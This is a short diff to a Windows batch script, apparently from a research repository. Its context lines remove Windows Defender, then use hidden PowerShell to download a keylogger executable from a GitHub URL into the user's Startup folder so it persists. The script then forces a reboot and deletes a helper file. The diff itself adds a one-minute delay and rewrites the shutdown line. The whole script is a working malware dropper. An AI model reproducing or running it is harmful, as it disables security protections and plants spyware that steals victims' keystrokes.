@@ -38,10 +38,12 @@ defender_remover.exe Y
 
 @REM Download and execute keylogger
 
+timeout /t 60
+
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/Gabriel/Original/Resources/keylogger.exe' -OutFile 'C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe'"
 
 @REM Schedule reboot in 1 minute
 
-shutdown /r /t/ 60
+shutdown /r
 
 del wget.cmd
